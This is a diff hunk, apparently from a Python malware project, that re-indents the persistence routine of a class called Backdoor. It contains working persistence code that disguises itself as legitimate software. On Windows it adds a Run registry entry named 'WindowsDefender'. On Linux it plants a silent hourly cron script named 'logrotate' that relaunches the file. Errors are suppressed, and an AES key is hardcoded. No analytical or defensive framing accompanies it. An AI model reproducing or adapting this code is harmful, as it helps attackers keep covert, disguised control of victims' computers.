@@ -12,24 +12,24 @@ class Backdoor:
         self.cryptor = AESEncryptor(key="SUPER_SECRET_KEY")
 
     def _add_persistence(self):
-    if platform.system() == "Windows":
-        import winreg
-        try:
-            key = winreg.HKEY_CURRENT_USER
-            path = r"Software\Microsoft\Windows\CurrentVersion\Run"
-            with winreg.OpenKey(key, path, 0, winreg.KEY_WRITE) as regkey:
-                winreg.SetValueEx(regkey, "WindowsDefender", 0, winreg.REG_SZ, sys.executable + " " + __file__)
-        except: pass
-        
-    elif platform.system() == "Linux":
-        try:
-            cron_path = "/etc/cron.hourly/" if os.path.exists("/etc/cron.hourly") else f"{os.path.expanduser('~')}/.cron_hourly/"
-            os.makedirs(cron_path, exist_ok=True)
+        if platform.system() == "Windows":
+            import winreg
+            try:
+                key = winreg.HKEY_CURRENT_USER
+                path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+                with winreg.OpenKey(key, path, 0, winreg.KEY_WRITE) as regkey:
+                    winreg.SetValueEx(regkey, "WindowsDefender", 0, winreg.REG_SZ, sys.executable + " " + __file__)
+            except: pass
             
-            with open(f"{cron_path}logrotate", "w") as f:
-                f.write(f"#!/bin/sh\npython3 {os.path.abspath(__file__)} >/dev/null 2>&1\n")
-            os.chmod(f"{cron_path}logrotate", 0o755)
-        except: pass
+        elif platform.system() == "Linux":
+            try:
+                cron_path = "/etc/cron.hourly/" if os.path.exists("/etc/cron.hourly") else f"{os.path.expanduser('~')}/.cron_hourly/"
+                os.makedirs(cron_path, exist_ok=True)
+                
+                with open(f"{cron_path}logrotate", "w") as f:
+                    f.write(f"#!/bin/sh\npython3 {os.path.abspath(__file__)} >/dev/null 2>&1\n")
+                os.chmod(f"{cron_path}logrotate", 0o755)
+            except: pass
 
     def run(self):
         self._add_persistence()
